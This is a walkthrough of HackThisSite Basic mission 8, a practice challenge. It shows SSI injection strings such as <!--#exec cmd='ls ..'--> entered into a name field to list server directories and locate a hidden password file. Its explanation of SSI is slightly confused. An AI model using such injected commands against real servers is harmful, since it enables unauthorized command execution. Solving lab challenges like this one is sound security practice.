The password is yet again hidden in an unknown file. Sam's daughter has begun learning PHP, and has a small script to
demonstrate her knowledge. Requirements: Knowledge of SSI (dynamic html executed by the server, rather than the browser)

Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar
program. Sam has saved the unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/

However, Sam's young daughter Stephanie has just learned to program in PHP. She's talented for her age, but she knows
nothing about security. She recently learned about saving files, and she wrote a script to demonstrate her ability.

SSI is a server-side include, which means that the server will execute the code in the file, and then insert the result
into the page. This is different from client-side includes, which are executed by the browser. SSI is a very powerful
tool, and can be used to include the contents of a file, or to execute a program. The syntax for SSI is
<!--#exec cmd="ls ../"--> . The virtual attribute tells the server to look for the file in the same directory
as the current file. The file can be any type of file, including PHP, HTML, or even a binary executable.

we can easily run the command <!--#exec cmd="ls"--> to get the list of files in the present directory
the output is something like this  ->
Hi,  fviqpmaw.shtml kqbybdzc.shtml dzrnmzgx.shtml npcsygfl.shtml! Your name contains 254 characters.

now we can use the command <!--#exec cmd="ls .."--> to get the previous directory listing

the output is something like this ->
Hi, au12ha39vc.php index.php level8.php tmp! Your name contains 39 characters.

file au12ha39vc.php contains the password

now to the next challenge Basic 9
